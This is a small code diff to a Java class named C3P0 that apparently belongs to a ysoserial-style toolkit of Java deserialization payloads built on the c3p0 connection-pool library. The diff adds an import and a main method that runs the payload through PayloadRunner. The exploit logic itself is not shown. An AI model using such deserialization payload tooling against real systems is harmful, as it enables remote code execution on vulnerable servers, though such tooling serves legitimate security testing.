@@ -12,6 +12,7 @@ import javax.naming.Referenceable;
 import javax.sql.ConnectionPoolDataSource;
 import javax.sql.PooledConnection;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import com.mchange.v2.c3p0.PoolBackedDataSource;
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
 
@@ -94,5 +95,8 @@ public class C3P0 implements ObjectPayload<Object> {
 			return null;
 		}
 
+	}
+	public static void main ( final String[] args ) throws Exception {
+		PayloadRunner.run(C3P0.class, args);
 	}
 }
